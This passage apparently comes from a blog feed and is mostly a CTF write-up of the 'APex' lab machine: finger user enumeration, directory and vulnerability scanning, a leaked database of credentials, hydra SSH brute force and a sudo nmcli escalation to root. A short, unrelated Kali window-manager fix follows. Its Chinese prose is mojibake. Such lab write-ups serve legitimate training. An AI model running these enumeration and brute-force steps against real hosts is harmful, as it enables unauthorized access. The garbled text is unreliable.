   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.
               wordlists/unix_users.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/finger/finger_users) &gt; set RHOSTS 192.168.205.148
RHOSTS =&gt; 192.168.205.148
msf6 auxiliary(scanner/finger/finger_users) &gt; run
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

ÊèêÂèñÊï∞ÊçÆËøõË°åÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat user |awk -F ': ' '{print $2}'
_apt
backup
bin
daemon
dnsmasq
games
gnats
irc
list
lp
mail
man
messagebus
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
uuidd
www-data
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ while read -r user; do echo '$user' | nc -vn 192.168.205.148 79; done &lt; user
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: _apt                             Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: backup                           Name: backup
Directory: /var/backups                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: bin                              Name: bin
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: daemon                           Name: daemon
Directory: /usr/sbin                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: dnsmasq                          Name: dnsmasq
Directory: /var/lib/misc                Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: games                            Name: games
Directory: /usr/games                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: gnats                            Name: Gnats Bug-Reporting System (admin)
Directory: /var/lib/gnats               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: irc                              Name: ircd
Directory: /run/ircd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: list                             Name: Mailing List Manager
Directory: /var/list                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: lp                               Name: lp
Directory: /var/spool/lpd               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: mail                             Name: mail
Directory: /var/mail                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: man                              Name: man
Directory: /var/cache/man               Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: messagebus                       Name: 
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: news                             Name: news
Directory: /var/spool/news              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: nobody                           Name: nobody
Directory: /nonexistent                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: proxy                            Name: proxy
Directory: /bin                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sshd                             Name: 
Directory: /run/sshd                    Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sync                             Name: sync
Directory: /bin                         Shell: /bin/sync
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: sys                              Name: sys
Directory: /dev                         Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-coredump                 Name: systemd Core Dumper
Directory: /                            Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-network                  Name: systemd Network Management
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-resolve                  Name: systemd Resolver
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: systemd-timesync                 Name: systemd Time Synchronization
Directory: /run/systemd                 Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uucp                             Name: uucp
Directory: /var/spool/uucp              Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: uuidd                            Name: 
Directory: /run/uuidd                   Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.
(UNKNOWN) [192.168.205.148] 79 (finger) open
Login: www-data                         Name: www-data
Directory: /var/www                     Shell: /usr/sbin/nologin
Never logged in.
No mail.
No Plan.

```

Ê≤°ÊúâÊúâÊÑèÊÄùÁöÑ‰∏úË•øÔºåÊàë‰ª¨ÂéªÁúãÁúãWebÊúçÂä°Âêß

![Image](https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b)

Ê≤°ÊúâÊúâÊÑèÊÄùÁöÑ‰∏úË•øÔºåÊ∫êÁ†Å‰πüÊ≤°ÊúâÔºåÊàë‰ª¨ÂéªÁàÜÁ†¥ÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u 'http://192.168.205.148' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.148
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 401) [Size: 462]
/index.html           (Status: 200) [Size: 878]
/server-status        (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]

```

![Image](https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7)

Â•ΩÂÉèÊâæÂà∞ÈáçÁÇπ‰∫ÜÔºåÊâ´Êèè‰∏Ä‰∏ãÊû∂ÊûÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nuclei -u 192.168.205.148                      

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7656
[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 380 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 1698 (Reduced 1598 Requests)
[INF] Using Interactsh Server: oast.fun
[waf-detect:apachegeneric] [http] [info] http://192.168.205.148
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[ssh-password-auth] [javascript] [info] 192.168.205.148:22
[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ['['publickey','password']']
[openssh-detect] [tcp] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[options-method] [http] [info] http://192.168.205.148 ['HEAD,GET,POST,OPTIONS']
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
[apache-detect] [http] [info] http://192.168.205.148 ['Apache/2.4.62 (Debian)']

```

Êó†ÊûúÔºåÊã∑‰∏Ä‰ªΩÁΩëÁ´ô‰∏ãÊù•ÔºåËøòÊòØÊ≤°Êúâ‰∏úË•ø„ÄÇ‰ªîÁªÜÊÉ≥ÊÉ≥Â•ΩÂÉèÂ∞±Âè™ÊúâÈÇ£‰∏™Ê≥ïËÄÅÊúâÁâπËâ≤‰∫ÜÔºåÊêú‰∏Ä‰∏ã

![Image](https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e)

Á≠â‰ºöÔºå‰∏ç‰ºöÊòØÂú®ÈÇ£‰∏™79ÊúçÂä°ÁúãËøô‰∏™‰∫∫ÁöÑ‰ø°ÊÅØÂêß

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -vn 192.168.205.148 79
(UNKNOWN) [192.168.205.148] 79 (finger) open
Horus
finger: Horus: no such user.
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -vn 192.168.205.148 79
(UNKNOWN) [192.168.205.148] 79 (finger) open
horus      
Login: horus                            Name: 
Directory: /home/horus                  Shell: /bin/bash
Never logged in.
Mail forwarded to horus@point.nyx
No mail.
PGP key:
personal notes: H0Ru$$3rv3
No Plan.
```

ÊàëÂéª.....

![Image](https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa)

‰∏ãËΩΩ‰∏ãÊù•ÁúãÁúã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sqlite3 ~/Downloads/database.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter '.help' for usage hints.
sqlite&gt; .tables
users
sqlite&gt; select * from users
   ...&gt; ;
1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO
2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy
```

Â∞ùËØïÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp|awk -F '|' '{print $2}'
anubis
amon
seth
osiris

                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp|awk -F '|' '{print $2}' &gt; user
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat user      
anubis
amon
seth
osiris

                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp|awk -F '|' '{print $3}' &gt; pass
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat pass                            
L44NxKRnP7wxrBsxibpDORySkbEHRO
xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
ITA96l3isg4uV2Sm8eYn41XVfxprFy

                                      
```

hydraÂêØÂä®

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), ~1 try per task
[DATA] attacking ssh://192.168.205.148:22/
[22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58

```

ÁôªÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh seth@192.168.205.148     
The authenticity of host '192.168.205.148 (192.168.205.148)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.148' (ED25519) to the list of known hosts.
seth@192.168.205.148's password: 
seth@apex:~$ id
uid=1001(seth) gid=1001(seth) grupos=1001(seth)

```

# 3.ÊèêÊùÉ

```bash
seth@apex:~$ sudo -l
-bash: sudo: orden no encontrada
seth@apex:~$ which sudo
seth@apex:~$ cat /etc/sudo
sudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  
seth@apex:~$ cat /etc/sudoers
cat: /etc/sudoers: Permiso denegado
seth@apex:~$ /etc/sudo -l
-bash: /etc/sudo: No existe el fichero o el directorio
seth@apex:~$ find / -name sudo 2&gt;/dev/null
/var/lib/sudo
/etc/init.d/sudo
/etc/pam.d/sudo
/run/sudo
/usr/sbin/sudo
/usr/share/lintian/overrides/sudo
/usr/share/bash-completion/completions/sudo
/usr/share/doc/sudo
/usr/lib/sudo
seth@apex:~$ /run/sudo -l
-bash: /run/sudo: Es un directorio
seth@apex:~$ /usr/sbin/sudo -l
Matching Defaults entries for seth on apex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seth may run the following commands on apex:
    (root) NOPASSWD: /usr/bin/nmcli

```

ËøòÁúüÊúâ‰∫∫Âπ≤Ëøô‰∫ãÂïäÔºåÁÑ∂ÂêéÊàëÂ∞±Âç°‰Ωè‰∫Ü„ÄÇÁ≠âÂà∞8ÁÇπÁæ§ÈáåÂ§ß‰Ω¨Âèë‰∫ÜwpÊàëÊâçÂèëÁé∞ÂèàÊòØÁº©Â∞èÊèêÊùÉ

![Image](https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3)

Âú®ÂüéÂçóËä±Â∑≤ÂºÄÂ§ß‰Ω¨ÁöÑwpÁúãÂà∞‰∫ÜÂéüÁêÜÔºö

![Image](https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8)

```bash
!/bin/bash
root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)
```

‰ª•‰∏ã‰πüÊòØÂ§ß‰Ω¨ÁöÑÊÄùË∑Ø

![Image](https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nyx_APex.html</guid><pubDate>Fri, 27 Jun 2025 09:33:45 +0000</pubDate></item><item><title>Kali Linux ÊãØÊïëËÆ°ÂàíÔºö‰øÆÂ§çÁ™óÂè£Êó†Ê≥ïÁßªÂä®ÂèäÊéßÂà∂ÊåâÈíÆÊ∂àÂ§±ÈóÆÈ¢ò</title><link>https://7r1UMPHK.github.io/post/Kali%20Linux%20-zheng-jiu-ji-hua-%EF%BC%9A-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html</link><description>## ÈóÆÈ¢òÂú∫ÊôØ

Âú®‰ΩøÁî® Kali Linux (ÈÄöÂ∏∏ÊòØ XFCE Ê°åÈù¢ÁéØÂ¢É) Êó∂ÔºåÂèØËÉΩ‰ºöÈÅáÂà∞‰∏Ä‰∏™‰ª§‰∫∫Âõ∞ÊÉëÁöÑÈóÆÈ¢òÔºöÂú®ÁôªÂΩïÁ≥ªÁªüÂêéÔºåÂ∫îÁî®Á®ãÂ∫èÁ™óÂè£ÔºàÂ¶ÇÁªàÁ´ØÔºâÁ™ÅÁÑ∂Â§±Âéª‰∫ÜÂÖ∂Ê†áÈ¢òÊ†èÔºåËøôÊÑèÂë≥ÁùÄÂè≥‰∏äËßíÁöÑÊúÄÂ∞èÂåñ„ÄÅÊúÄÂ§ßÂåñ„ÄÅÂÖ≥Èó≠ÊåâÈíÆÊ∂àÂ§±‰∫ÜÔºåÂπ∂‰∏îÊó†Ê≥ïÈÄöËøáÈº†Ê†áÊãñÂä®Êù•ÁßªÂä®Á™óÂè£„ÄÇÂêåÊó∂Ôºå‰ªªÂä°Ê†è‰∏äÁöÑÂ∫îÁî®Á®ãÂ∫èÂõæÊ†á‰πüÂèØËÉΩÈöè‰πãÊ∂àÂ§±„ÄÇ

Ê≠£Â¶ÇÁî®Êà∑ÊâÄËø∞ÔºåËøôÁßçÊÉÖÂÜµÂèØËÉΩÂú®Ê≥®ÈîÄÂπ∂ÈáçÊñ∞ÁôªÂΩïÂêéÂèëÁîüÔºåÊâìÊñ≠‰∫ÜÊ≠£Â∏∏ÁöÑÂ∑•‰ΩúÊµÅÁ®ã„ÄÇ

## ÈóÆÈ¢òÂàÜÊûê

Ëøô‰∏™ÈóÆÈ¢òÈÄöÂ∏∏ÊåáÂêë **Á™óÂè£ÁÆ°ÁêÜÂô® (Window Manager)** Âá∫Áé∞‰∫ÜÊïÖÈöú„ÄÇÂú®Ê†áÂáÜÁöÑ Kali XFCE ÁéØÂ¢É‰∏≠ÔºåÈªòËÆ§ÁöÑÁ™óÂè£ÁÆ°ÁêÜÂô®ÊòØ **Xfwm4**„ÄÇÂÆÉË¥üË¥£ÁªòÂà∂Á™óÂè£ËæπÊ°Ü„ÄÅÊ†áÈ¢òÊ†è„ÄÅÊéßÂà∂ÊåâÈíÆÔºåÂπ∂Â§ÑÁêÜÁ™óÂè£ÁöÑÁßªÂä®„ÄÅÂ§ßÂ∞èË∞ÉÊï¥Á≠âÊìç‰Ωú„ÄÇÂΩì Xfwm4 Êú™ËÉΩÊ≠£Â∏∏ÂêØÂä®„ÄÅÂ¥©Ê∫ÉÊàñË¢´ÊÑèÂ§ñËøõÁ®ãÊõøÊç¢Êó∂ÔºåÂ∞±‰ºöÂá∫Áé∞‰∏äËø∞ÁóáÁä∂„ÄÇ

## Ëß£ÂÜ≥ÊñπÊ°à

Âπ∏ËøêÁöÑÊòØÔºåËøô‰∏™ÈóÆÈ¢òÊúâÁõ¥Êé•ÁöÑËß£ÂÜ≥ÊñπÊ≥ïÔºåÂåÖÊã¨‰∏¥Êó∂‰øÆÂ§çÂíåÊ∞∏‰πÖÊÄßËÆæÁΩÆ„ÄÇ

### 1. ‰∏¥Êó∂Ëß£ÂÜ≥ÊñπÊ≥ï (Á´ãÂç≥ÊÅ¢Â§ç)

Â¶ÇÊûú‰Ω†ÈÅáÂà∞‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåÂèØ‰ª•Á´ãÂç≥Â∞ùËØïÊâãÂä®ÈáçÂêØÁ™óÂè£ÁÆ°ÁêÜÂô®„ÄÇ

* **ÊâìÂºÄ‰∏Ä‰∏™ÁªàÁ´Ø**Ôºö

  *   Â∞ùËØï‰ΩøÁî®Âø´Êç∑ÈîÆÔºåÂ¶Ç `Ctrl+Alt+T`„ÄÇ
  *   Â¶ÇÊûúÊó†Ê≥ïÊâìÂºÄÊñ∞ÁªàÁ´ØÔºåÁúãÊòØÂê¶ËÉΩÈÄöËøáÂ∫îÁî®Á®ãÂ∫èËèúÂçïÔºàÂ∑¶‰∏äËßí Kali ÂõæÊ†áÔºâÊâæÂà∞Âπ∂ÂêØÂä®‰∏Ä‰∏™„ÄÇ
  *   Â¶ÇÊûúÂÆûÂú®‰∏çË°åÔºåÂèØËÉΩÈúÄË¶ÅÂàáÊç¢Âà∞ TTY (Â¶Ç `Ctrl+Alt+F3`)ÔºåÁôªÂΩïÂêéÊâßË°åÂëΩ‰ª§ÔºåÂÜçÂàáÊç¢ÂõûÂõæÂΩ¢ÁïåÈù¢ (`Ctrl+Alt+F1` Êàñ `Ctrl+Alt+F7`)„ÄÇ

* **Âú®ÁªàÁ´Ø‰∏≠ÊâßË°å‰ª•‰∏ãÂëΩ‰ª§Ôºö**

  ```bash
  xfwm4 --replace &amp;
  ```

* **ÂëΩ‰ª§Ëß£ÈáäÔºö**

  *   `xfwm4`: Ë∞ÉÁî® XFCE Á™óÂè£ÁÆ°ÁêÜÂô®„ÄÇ
  *   `--replace`: ÊåáÁ§∫ `xfwm4` ÊõøÊç¢ÂΩìÂâçÊ≠£Âú®ËøêË°åÁöÑ‰ªª‰ΩïÁ™óÂè£ÁÆ°ÁêÜÂô®ÂÆû‰æãÔºàÂç≥‰ΩøÊ≤°ÊúâÂú®ËøêË°åÔºâ„ÄÇ
  *   `&amp;`: Â∞ÜÂëΩ‰ª§ÊîæÂà∞ÂêéÂè∞ÊâßË°åÔºåËøôÊ†∑ÂÖ≥Èó≠ÁªàÁ´ØÁ™óÂè£Êó∂‰∏ç‰ºöÁªàÊ≠¢ `xfwm4` ËøõÁ®ã„ÄÇ

ÊâßË°åÊ≠§ÂëΩ‰ª§ÂêéÔºå‰Ω†Â∫îËØ•ËÉΩÁ´ãÂàªÁúãÂà∞Á™óÂè£ÁöÑÊ†áÈ¢òÊ†èÂíåÊéßÂà∂ÊåâÈíÆÊÅ¢Â§çÊ≠£Â∏∏ÔºåÂπ∂‰∏îÂèØ‰ª•ÂÜçÊ¨°ÁßªÂä®Á™óÂè£„ÄÇ

### 2. ËÆæÁΩÆÂºÄÊú∫Ëá™ÂêØ (Ê∞∏‰πÖÊÄßËß£ÂÜ≥ÊñπÊ°à)

‰∏∫‰∫ÜÈÅøÂÖçÊØèÊ¨°ÁôªÂΩïÂêéÈÉΩÂèØËÉΩÈúÄË¶ÅÊâãÂä®ÊâßË°å‰∏äËø∞ÂëΩ‰ª§ÔºåÂèØ‰ª•Â∞Ü `xfwm4` ËÆæÁΩÆ‰∏∫Âú®ÁôªÂΩïÊó∂Ëá™Âä®ÂêØÂä®ÔºåÁ°Æ‰øùÂÆÉÊÄªÊòØËÉΩÊ≠£Á°ÆËøêË°å„ÄÇ

*   **ÊâìÂºÄ '‰ºöËØùÂíåÂêØÂä®' ËÆæÁΩÆÔºö**
    1.  ÁÇπÂáªÂ±èÂπïÂ∑¶‰∏äËßíÁöÑ **Â∫îÁî®Á®ãÂ∫èËèúÂçï** (Kali ÂõæÊ†á)„ÄÇ
    2.  Âú®ÊêúÁ¥¢Ê°Ü‰∏≠ËæìÂÖ• '‰ºöËØùÂíåÂêØÂä®' (Session and Startup)„ÄÇ
    3.  ÁÇπÂáªÊâìÂºÄËØ•Â∫îÁî®Á®ãÂ∫è„ÄÇ

*   **Ê∑ªÂä†Ëá™Âä®ÂêØÂä®È°πÔºö**
    1.  Âú® '‰ºöËØùÂíåÂêØÂä®' Á™óÂè£‰∏≠ÔºåÂàáÊç¢Âà∞ **'Â∫îÁî®Á®ãÂ∫èËá™Âä®ÂêØÂä®' (Application Autostart)** ÈÄâÈ°πÂç°„ÄÇ
    2.  ÁÇπÂáª **'+ Ê∑ªÂä†' (+ Add)** ÊåâÈíÆ„ÄÇ
    3.  Âú®ÂºπÂá∫ÁöÑÂØπËØùÊ°Ü‰∏≠Â°´ÂÜô‰ª•‰∏ã‰ø°ÊÅØÔºö
        *   **ÂêçÁß∞ (Name):** `XFWM4 Autostart` (Êàñ‰ªª‰Ωï‰Ω†ÂÆπÊòìËØÜÂà´ÁöÑÂêçÁß∞)
        *   **ÊèèËø∞ (Description):** `Á°Æ‰øù XFCE Á™óÂè£ÁÆ°ÁêÜÂô®Âú®ÁôªÂΩïÊó∂ÂêØÂä®` (ÂèØÈÄâ)
        *   **ÂëΩ‰ª§ (Command):** `xfwm4`
            *   *Ê≥®ÊÑèÔºöËøôÈáåÈÄöÂ∏∏‰∏çÈúÄË¶Å `--replace` ÂèÇÊï∞ÔºåÁ≥ªÁªüÂêØÂä®ËøáÁ®ãÂ∫îËÉΩÁ°Æ‰øù `xfwm4` Ê≠£Â∏∏Âä†ËΩΩ„ÄÇÂ¶ÇÊûúÂè™ÂÜô `xfwm4` ‰ªçÁÑ∂ÊúâÈóÆÈ¢òÔºåÂèØ‰ª•Â∞ùËØïÊîπ‰∏∫ `xfwm4 --replace`„ÄÇ*
        *   **Ëß¶ÂèëÂô® (Trigger):** ‰øùÊåÅÈªòËÆ§ÁöÑ `on login` Âç≥ÂèØ„ÄÇ

    4.  ÁÇπÂáª **'Á°ÆÂÆö' (OK)** Êàñ **'Ê∑ªÂä†' (Add)** ÊåâÈíÆ‰øùÂ≠ò„ÄÇ

*   **ÂÆåÊàêÔºö**
    ÂÖ≥Èó≠ '‰ºöËØùÂíåÂêØÂä®' Á™óÂè£„ÄÇÁé∞Âú®ÔºåÊØèÊ¨°‰Ω†ÁôªÂΩï Kali Linux Êó∂ÔºåÁ≥ªÁªüÈÉΩ‰ºöËá™Âä®Â∞ùËØïÂêØÂä® `xfwm4`Ôºå‰ªéËÄåÂ§ßÊ¶ÇÁéáÈÅøÂÖçÁ™óÂè£ÁÆ°ÁêÜÂô®‰∏¢Â§±ÁöÑÈóÆÈ¢ò„ÄÇ

## ÁªìËÆ∫

